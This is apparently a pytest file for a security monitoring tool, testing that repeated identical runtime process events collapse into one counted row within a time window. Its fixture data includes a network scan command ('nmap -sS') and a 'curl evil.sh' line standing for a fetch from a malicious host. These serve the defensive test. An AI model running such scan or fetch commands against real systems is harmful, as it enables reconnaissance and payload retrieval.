"""Runtime burst control: identical signals inside the window collapse into one
row with a count; a different signal, or one past the window, stays separate.
"""

from __future__ import annotations

from datetime import timedelta

from sqlalchemy import select

from odineyes.db.base import get_sessionmaker, init_db, session_scope
from odineyes.db.models import RuntimeEvent
from odineyes.inventory.repository import RuntimeEventRepository, _utcnow


def _rec(s, process):
    RuntimeEventRepository.record(
        s, event_type="process_execution", severity="medium",
        resource_id="i-1", process=process)


def test_identical_signals_collapse(tmp_path):
    url = f"sqlite:///{tmp_path}/rt.db"
    init_db(url)
    with session_scope(url) as s:
        for _ in range(5):
            _rec(s, "nmap -sS 10.0.0.0/24")   # a recon loop
        _rec(s, "curl evil.sh")               # distinct → its own row
    with get_sessionmaker(url)() as s:
        rows = list(s.execute(select(RuntimeEvent)).scalars())
    assert len(rows) == 2
    nmap = next(r for r in rows if r.process.startswith("nmap"))
    assert nmap.count == 5


def test_past_window_does_not_collapse(tmp_path):
    url = f"sqlite:///{tmp_path}/rt.db"
    init_db(url)
    with session_scope(url) as s:
        _rec(s, "nmap")
    with session_scope(url) as s:
        row = s.execute(select(RuntimeEvent)).scalar_one()
        row.observed_at = _utcnow() - timedelta(seconds=3600)  # age it out
    with session_scope(url) as s:
        _rec(s, "nmap")
    with get_sessionmaker(url)() as s:
        assert len(list(s.execute(select(RuntimeEvent)).scalars())) == 2
